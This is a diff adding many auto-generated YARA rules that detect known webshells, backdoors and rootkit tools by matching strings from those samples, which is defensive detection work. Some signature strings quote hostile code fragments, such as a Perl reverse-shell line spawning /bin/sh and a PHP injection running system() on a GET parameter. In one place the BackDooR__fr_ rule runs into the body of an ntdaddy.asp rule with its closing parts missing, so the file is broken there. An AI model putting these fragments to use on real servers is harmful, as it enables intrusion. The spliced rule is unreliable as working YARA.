+		description = "Webshells Auto-generated - file bdcli100.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b12163ac53789fb4f62e4f17a8c2e028"
+	strings:
+		$s5 = "unable to connect to "
+		$s8 = "backdoor is corrupted on "
+	condition:
+		all of them
+}
+
+rule HYTop_DevPack_2005Red {
+	meta:
+		description = "Webshells Auto-generated - file 2005Red.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
+	strings:
+		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
+		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
+		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
+	condition:
+		all of them
+}
+
+rule HYTop2006_rar_Folder_2006X2 {
+	meta:
+		description = "Webshells Auto-generated - file 2006X2.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "cc5bf9fc56d404ebbc492855393d7620"
+	strings:
+		$s2 = "Powered By "
+		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."
+	condition:
+		all of them
+}
+
+rule HYTop_CaseSwitch_2005 {
+	meta:
+		description = "Webshells Auto-generated - file 2005.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8bf667ee9e21366bc0bd3491cb614f41"
+	strings:
+		$s1 = "MSComDlg.CommonDialog"
+		$s2 = "CommonDialog1"
+		$s3 = "__vbaExceptHandler"
+		$s4 = "EVENT_SINK_Release"
+		$s5 = "EVENT_SINK_AddRef"
+		$s6 = "By Marcos"
+		$s7 = "EVENT_SINK_QueryInterface"
+		$s8 = "MethCallEngine"
+	condition:
+		all of them
+}
+
+rule eBayId_index3 {
+	meta:
+		description = "Webshells Auto-generated - file index3.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "0412b1e37f41ea0d002e4ed11608905f"
+	strings:
+		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"
+	condition:
+		all of them
+}
+
+rule FSO_s_phvayv {
+	meta:
+		description = "Webshells Auto-generated - file phvayv.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "205ecda66c443083403efb1e5c7f7878"
+	strings:
+		$s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"
+	condition:
+		all of them
+}
+
+rule byshell063_ntboot {
+	meta:
+		description = "Webshells Auto-generated - file ntboot.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
+	strings:
+		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
+		$s1 = "Failure ... Access is Denied !"
+		$s2 = "Dumping Description to Registry..."
+		$s3 = "Opening Service .... Failure !"
+	condition:
+		all of them
+}
+
+rule FSO_s_casus15_2 {
+	meta:
+		description = "Webshells Auto-generated - file casus15.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8d155b4239d922367af5d0a1b89533a3"
+	strings:
+		$s0 = "copy ( $dosya_gonder"
+	condition:
+		all of them
+}
+
+rule installer {
+	meta:
+		description = "Webshells Auto-generated - file installer.cmd"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "a507919ae701cf7e42fa441d3ad95f8f"
+	strings:
+		$s0 = "Restore Old Vanquish"
+		$s4 = "ReInstall Vanquish"
+	condition:
+		all of them
+}
+
+rule uploader {
+	meta:
+		description = "Webshells Auto-generated - file uploader.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b9a9aab319964351b46bd5fc9d6246a8"
+	strings:
+		$s0 = "move_uploaded_file($userfile, \"entrika.php\"); "
+	condition:
+		all of them
+}
+
+rule FSO_s_remview_2 {
+	meta:
+		description = "Webshells Auto-generated - file remview.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b4a09911a5b23e00b55abe546ded691c"
+	strings:
+		$s0 = "<xmp>$out</"
+		$s1 = ".mm(\"Eval PHP code\")."
+	condition:
+		all of them
+}
+
+rule FeliksPack3___PHP_Shells_r57 {
+	meta:
+		description = "Webshells Auto-generated - file r57.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "903908b77a266b855262cdbce81c3f72"
+	strings:
+		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."
+	condition:
+		all of them
+}
+
+rule HYTop2006_rar_Folder_2006X {
+	meta:
+		description = "Webshells Auto-generated - file 2006X.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
+	strings:
+		$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
+		$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""
+	condition:
+		all of them
+}
+
+rule FSO_s_phvayv_2 {
+	meta:
+		description = "Webshells Auto-generated - file phvayv.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "205ecda66c443083403efb1e5c7f7878"
+	strings:
+		$s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"
+	condition:
+		all of them
+}
+
+rule elmaliseker {
+	meta:
+		description = "Webshells Auto-generated - file elmaliseker.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "ccf48af0c8c09bbd038e610a49c9862e"
+	strings:
+		$s0 = "javascript:Command('Download'"
+		$s5 = "zombie_array=array("
+	condition:
+		all of them
+}
+
+rule shelltools_g0t_root_resolve {
+	meta:
+		description = "Webshells Auto-generated - file resolve.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "69bf9aa296238610a0e05f99b5540297"
+	strings:
+		$s0 = "3^n6B(Ed3"
+		$s1 = "^uldn'Vt(x"
+		$s2 = "\\= uPKfp"
+		$s3 = "'r.axV<ad"
+		$s4 = "p,modoi$=sr("
+		$s5 = "DiamondC8S t"
+		$s6 = "`lQ9fX<ZvJW"
+	condition:
+		all of them
+}
+
+rule FSO_s_RemExp {
+	meta:
+		description = "Webshells Auto-generated - file RemExp.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b69670ecdbb40012c73686cd22696eeb"
+	strings:
+		$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
+		$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
+		$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"
+	condition:
+		all of them
+}
+
+rule FSO_s_tool {
+	meta:
+		description = "Webshells Auto-generated - file tool.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "3a1e1e889fdd974a130a6a767b42655b"
+	strings:
+		$s7 = "\"\"%windir%\\\\calc.exe\"\")"
+	condition:
+		all of them
+}
+
+rule FeliksPack3___PHP_Shells_2005 {
+	meta:
+		description = "Webshells Auto-generated - file 2005.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "97f2552c2fafc0b2eb467ee29cc803c8"
+	strings:
+		$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
+		$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"
+	condition:
+		all of them
+}
+
+rule byloader {
+	meta:
+		description = "Webshells Auto-generated - file byloader.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "0f0d6dc26055653f5844ded906ce52df"
+	strings:
+		$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
+		$s1 = "Failure ... Access is Denied !"
+		$s2 = "NTFS Disk Driver Checking Service"
+		$s3 = "Dumping Description to Registry..."
+		$s4 = "Opening Service .... Failure !"
+	condition:
+		all of them
+}
+
+rule shelltools_g0t_root_Fport {
+	meta:
+		description = "Webshells Auto-generated - file Fport.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "dbb75488aa2fa22ba6950aead1ef30d5"
+	strings:
+		$s4 = "Copyright 2000 by Foundstone, Inc."
+		$s5 = "You must have administrator privileges to run fport - exiting..."
+	condition:
+		all of them
+}
+
+rule BackDooR__fr_ {
+	meta:
+		description = "Webshells Auto-generated - file BackDooR (fr).php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "a79cac2cf86e073a832aaf29a664f4be"
+	strings:
+		$s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit Webshells Auto-generated - file ntdaddy.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "f6262f3ad9f73b8d3e7d9ea5ec07a357"
+	strings:
+		$s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s"
+	condition:
+		all of them
+}
+
+rule nstview_nstview {
+	meta:
+		description = "Webshells Auto-generated - file nstview.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "3871888a0c1ac4270104918231029a56"
+	strings:
+		$s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"
+	condition:
+		all of them
+}
+
+rule HYTop_DevPack_upload {
+	meta:
+		description = "Webshells Auto-generated - file upload.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b09852bda534627949f0259828c967de"
+	strings:
+		$s0 = "<!-- PageUpload Below -->"
+	condition:
+		all of them
+}
+
+rule PasswordReminder {
+	meta:
+		description = "Webshells Auto-generated - file PasswordReminder.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
+	strings:
+		$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."
+	condition:
+		all of them
+}
+
+rule Pack_InjectT {
+	meta:
+		description = "Webshells Auto-generated - file InjectT.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "983b74ccd57f6195a0584cdfb27d55e8"
+	strings:
+		$s3 = "ail To Open Registry"
+		$s4 = "32fDssignim"
+		$s5 = "vide Internet S"
+		$s6 = "d]Software\\M"
+		$s7 = "TInject.Dll"
+	condition:
+		all of them
+}
+
+rule FSO_s_RemExp_2 {
+	meta:
+		description = "Webshells Auto-generated - file RemExp.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b69670ecdbb40012c73686cd22696eeb"
+	strings:
+		$s2 = " Then Response.Write \""
+		$s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>"
+	condition:
+		all of them
+}
+
+rule FSO_s_c99 {
+	meta:
+		description = "Webshells Auto-generated - file c99.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "5f9ba02eb081bba2b2434c603af454d0"
+	strings:
+		$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"
+	condition:
+		all of them
+}
+
+rule rknt_zip_Folder_RkNT {
+	meta:
+		description = "Webshells Auto-generated - file RkNT.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "5f97386dfde148942b7584aeb6512b85"
+	strings:
+		$s0 = "PathStripPathA"
+		$s1 = "`cLGet!Addr%"
+		$s2 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
+		$s3 = "oQToOemBuff* <="
+		$s4 = "ionCdunAsw[Us'"
+		$s6 = "CreateProcessW: %S"
+		$s7 = "ImageDirectoryEntryToData"
+	condition:
+		all of them
+}
+
+rule dbgntboot {
+	meta:
+		description = "Webshells Auto-generated - file dbgntboot.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "4d87543d4d7f73c1529c9f8066b475ab"
+	strings:
+		$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
+		$s3 = "sth junk the M$ Wind0wZ retur"
+	condition:
+		all of them
+}
+
+rule PHP_shell {
+	meta:
+		description = "Webshells Auto-generated - file shell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
+	strings:
+		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
+		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"
+	condition:
+		all of them
+}
+
+rule hxdef100 {
+	meta:
+		description = "Webshells Auto-generated - file hxdef100.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "55cc1769cef44910bd91b7b73dee1f6c"
+	strings:
+		$s0 = "RtlAnsiStringToUnicodeString"
+		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
+		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"
+	condition:
+		all of them
+}
+
+rule rdrbs100 {
+	meta:
+		description = "Webshells Auto-generated - file rdrbs100.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "7c752bcd6da796d80a6830c61a632bff"
+	strings:
+		$s3 = "Server address must be IP in A.B.C.D format."
+		$s4 = " mapped ports in the list. Currently "
+	condition:
+		all of them
+}
+
+rule Mithril_Mithril {
+	meta:
+		description = "Webshells Auto-generated - file Mithril.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "017191562d72ab0ca551eb89256650bd"
+	strings:
+		$s0 = "OpenProcess error!"
+		$s1 = "WriteProcessMemory error!"
+		$s4 = "GetProcAddress error!"
+		$s5 = "HHt`HHt\\"
+		$s6 = "Cmaudi0"
+		$s7 = "CreateRemoteThread error!"
+		$s8 = "Kernel32"
+		$s9 = "VirtualAllocEx error!"
+	condition:
+		all of them
+}
+
+rule hxdef100_2 {
+	meta:
+		description = "Webshells Auto-generated - file hxdef100.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
+	strings:
+		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
+		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
+		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
+	condition:
+		all of them
+}
+
+rule Release_dllTest {
+	meta:
+		description = "Webshells Auto-generated - file dllTest.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "76a59fc3242a2819307bb9d593bef2e0"
+	strings:
+		$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
+		$s1 = "0 0&00060K0R0X0f0l0q0w0"
+		$s2 = ": :$:(:,:0:4:8:D:`=d="
+		$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
+		$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
+		$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
+		$s6 = "0)0O0\\0a0o0\"1E1P1q1"
+		$s7 = "<.<I<d<h<l<p<t<x<|<"
+		$s8 = "3&31383>3F3Q3X3`3f3w3|3"
+		$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="
+	condition:
+		all of them
+}
+
+rule webadmin {
+	meta:
+		description = "Webshells Auto-generated - file webadmin.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "3a90de401b30e5b590362ba2dde30937"
+	strings:
+		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"
+	condition:
+		all of them
+}
+
+rule commands {
+	meta:
+		description = "Webshells Auto-generated - file commands.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "174486fe844cb388e2ae3494ac2d1ec2"
+	strings:
+		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
+		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"
+	condition:
+		all of them
+}
+
+rule hkdoordll {
+	meta:
+		description = "Webshells Auto-generated - file hkdoordll.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b715c009d47686c0e62d0981efce2552"
+	strings:
+		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"
+	condition:
+		all of them
+}
+
+rule r57shell_2 {
+	meta:
+		description = "Webshells Auto-generated - file r57shell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8023394542cddf8aee5dec6072ed02b5"
+	strings:
+		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"
+	condition:
+		all of them
+}
+
+rule Mithril_v1_45_dllTest {
+	meta:
+		description = "Webshells Auto-generated - file dllTest.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1b9e518aaa62b15079ff6edb412b21e9"
+	strings:
+		$s3 = "syspath"
+		$s4 = "\\Mithril"
+		$s5 = "--list the services in the computer"
+	condition:
+		all of them
+}
+
+rule dbgiis6cli {
+	meta:
+		description = "Webshells Auto-generated - file dbgiis6cli.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "3044dceb632b636563f66fee3aaaf8f3"
+	strings:
+		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
+		$s5 = "###command:(NO more than 100 bytes!)"
+	condition:
+		all of them
+}
+
+rule remview_2003_04_22 {
+	meta:
+		description = "Webshells Auto-generated - file remview_2003_04_22.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "17d3e4e39fbca857344a7650f7ea55e3"
+	strings:
+		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""
+	condition:
+		all of them
+}
+
+rule FSO_s_test {
+	meta:
+		description = "Webshells Auto-generated - file test.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "82cf7b48da8286e644f575b039a99c26"
+	strings:
+		$s0 = "$yazi = \"test\" . \"\\r\\n\";"
+		$s2 = "fwrite ($fp, \"$yazi\");"
+	condition:
+		all of them
+}
+
+rule Debug_cress {
+	meta:
+		description = "Webshells Auto-generated - file cress.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "36a416186fe010574c9be68002a7286a"
+	strings:
+		$s0 = "\\Mithril "
+		$s4 = "Mithril.exe"
+	condition:
+		all of them
+}
+
+rule thelast_index3 {
+	meta:
+		description = "Webshells Auto-generated - file index3.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "cceff6dc247aaa25512bad22120a14b4"
+	strings:
+		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"
+	condition:
+		all of them
+}
+
+rule adjustcr {
+	meta:
+		description = "Webshells Auto-generated - file adjustcr.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "17037fa684ef4c90a25ec5674dac2eb6"
+	strings:
+		$s0 = "$Info: This file is packed with the UPX executable packer $"
+		$s2 = "$License: NRV for UPX is distributed under special license $"
+		$s6 = "AdjustCR Carr"
+		$s7 = "ION\\System\\FloatingPo"
+	condition:
+		all of them
+}
+
+rule FeliksPack3___PHP_Shells_xIShell {
+	meta:
+		description = "Webshells Auto-generated - file xIShell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "997c8437c0621b4b753a546a53a88674"
+	strings:
+		$s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"
+	condition:
+		all of them
+}
+
+rule HYTop_AppPack_2005 {
+	meta:
+		description = "Webshells Auto-generated - file 2005.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
+	strings:
+		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"
+	condition:
+		all of them
+}
+
+rule xssshell {
+	meta:
+		description = "Webshells Auto-generated - file xssshell.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
+	strings:
+		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"
+	condition:
+		all of them
+}
+
+rule FeliksPack3___PHP_Shells_usr {
+	meta:
+		description = "Webshells Auto-generated - file usr.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "ade3357520325af50c9098dc8a21a024"
+	strings:
+		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"
+	condition:
+		all of them
+}
+
+rule FSO_s_phpinj {
+	meta:
+		description = "Webshells Auto-generated - file phpinj.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "dd39d17e9baca0363cc1c3664e608929"
+	strings:
+		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
+	condition:
+		all of them
+}
+
+rule xssshell_db {
+	meta:
+		description = "Webshells Auto-generated - file db.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "cb62e2ec40addd4b9930a9e270f5b318"
+	strings:
+		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"
+	condition:
+		all of them
+}
+
+rule PHP_sh {
+	meta:
+		description = "Webshells Auto-generated - file sh.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1e9e879d49eb0634871e9b36f99fe528"
+	strings:
+		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"
+	condition:
+		all of them
+}
+
+rule xssshell_default {
+	meta:
+		description = "Webshells Auto-generated - file default.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "d156782ae5e0b3724de3227b42fcaf2f"
+	strings:
+		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"
+	condition:
+		all of them
+}
+
+rule EditServer_Webshell_2 {
+	meta:
+		description = "Webshells Auto-generated - file EditServer.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
+	strings:
+		$s0 = "@HOTMAIL.COM"
+		$s1 = "Press Any Ke"
+		$s3 = "glish MenuZ"
+	condition:
+		all of them
+}
+
+rule by064cli {
+	meta:
+		description = "Webshells Auto-generated - file by064cli.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "10e0dff366968b770ae929505d2a9885"
+	strings:
+		$s7 = "packet dropped,redirecting"
+		$s9 = "input the password(the default one is 'by')"
+	condition:
+		all of them
+}
+
+rule Mithril_dllTest {
+	meta:
+		description = "Webshells Auto-generated - file dllTest.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "a8d25d794d8f08cd4de0c3d6bf389e6d"
+	strings:
+		$s0 = "please enter the password:"
+		$s3 = "\\dllTest.pdb"
+	condition:
+		all of them
+}
+
+rule peek_a_boo {
+	meta:
+		description = "Webshells Auto-generated - file peek-a-boo.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "aca339f60d41fdcba83773be5d646776"
+	strings:
+		$s0 = "__vbaHresultCheckObj"
+		$s1 = "\\VB\\VB5.OLB"
+		$s2 = "capGetDriverDescriptionA"
+		$s3 = "__vbaExceptHandler"
+		$s4 = "EVENT_SINK_Release"
+		$s8 = "__vbaErrorOverflow"
+	condition:
+		all of them
+}
+
+rule fmlibraryv3 {
+	meta:
+		description = "Webshells Auto-generated - file fmlibraryv3.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "c34c248fed6d5a20d8203924a2088acc"
+	strings:
+		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"
+	condition:
+		all of them
+}
+
+rule Debug_dllTest_2 {
+	meta:
+		description = "Webshells Auto-generated - file dllTest.dll"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "1b9e518aaa62b15079ff6edb412b21e9"
+	strings:
+		$s4 = "\\Debug\\dllTest.pdb"
+		$s5 = "--list the services in the computer"
+	condition:
+		all of them
+}
+
+rule connector {
+	meta:
+		description = "Webshells Auto-generated - file connector.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "3ba1827fca7be37c8296cd60be9dc884"
+	strings:
+		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
+		$s4 = "Add UNIQUE ID for victims / zombies"
+	condition:
+		all of them
+}
+
+rule shelltools_g0t_root_HideRun {
+	meta:
+		description = "Webshells Auto-generated - file HideRun.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "45436d9bfd8ff94b71eeaeb280025afe"
+	strings:
+		$s0 = "Usage -- hiderun [AppName]"
+		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."
+	condition:
+		all of them
+}
+
+rule regshell {
+	meta:
+		description = "Webshells Auto-generated - file regshell.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "db2fdc821ca6091bab3ebd0d8bc46ded"
+	strings:
+		$s0 = "Changes the base hive to HKEY_CURRENT_USER."
+		$s4 = "Displays a list of values and sub-keys in a registry Hive."
+		$s5 = "Enter a menu selection number (1 - 3) or 99 to Exit: "
+	condition:
+		all of them
+}
+
+rule PHP_Shell_v1_7 {
+	meta:
+		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "b5978501c7112584532b4ca6fb77cba5"
+	strings:
+		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"
+	condition:
+		all of them
+}
+
+rule xssshell_save {
+	meta:
+		description = "Webshells Auto-generated - file save.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "865da1b3974e940936fe38e8e1964980"
+	strings:
+		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
+		$s5 = "VictimID = fm_NStr(Victims(i))"
+	condition:
+		all of them
+}
+
+rule screencap {
+	meta:
+		description = "Webshells Auto-generated - file screencap.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "51139091dea7a9418a50f2712ea72aa6"
+	strings:
+		$s0 = "GetDIBColorTable"
+		$s1 = "Screen.bmp"
+		$s2 = "CreateDCA"
+	condition:
+		all of them
+}
+
+rule FSO_s_phpinj_2 {
+	meta:
+		description = "Webshells Auto-generated - file phpinj.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "dd39d17e9baca0363cc1c3664e608929"
+	strings:
+		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"
+	condition:
+		all of them
+}
+
+rule FSO_s_ajan {
+	meta:
+		description = "Webshells Auto-generated - file ajan.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "22194f8c44524f80254e1b5aec67b03e"
+	strings:
+		$s4 = "entrika.write \"BinaryStream.SaveToFile"
+	condition:
+		all of them
+}
+
+rule c99shell {
+	meta:
+		description = "Webshells Auto-generated - file c99shell.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
+	strings:
+		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"
+	condition:
+		all of them
+}
+
+rule phpspy_2005_full {
+	meta:
+		description = "Webshells Auto-generated - file phpspy_2005_full.php"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "d1c69bb152645438440e6c903bac16b2"
+	strings:
+		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"
+	condition:
+		all of them
+}
+
+rule FSO_s_zehir4_2 {
+	meta:
+		description = "Webshells Auto-generated - file zehir4.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "5b496a61363d304532bcf52ee21f5d55"
+	strings:
+		$s4 = "\"Program Files\\Serv-u\\Serv"
+	condition:
+		all of them
+}
+
+rule httpdoor {
+	meta:
+		description = "Webshells Auto-generated - file httpdoor.exe"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "6097ea963455a09474471a9864593dc3"
+	strings:
+		$s4 = "''''''''''''''''''DaJKHPam"
+		$s5 = "o,WideCharR]!n]"
+		$s6 = "HAutoComplete"
+		$s7 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:sch"
+	condition:
+		all of them
+}
+
+rule FSO_s_indexer_2 {
+	meta:
+		description = "Webshells Auto-generated - file indexer.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "135fc50f85228691b401848caef3be9e"
+	strings:
+		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"
+	condition:
+		all of them
+}
+
+rule HYTop_DevPack_2005 {
+	meta:
+		description = "Webshells Auto-generated - file 2005.asp"
+		author = "Yara Bulk Rule Generator by Florian Roth"
+		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
+	strings:
+		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
+		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
+		$s9 = "scrollbar-face-color:#E4E4F3;"
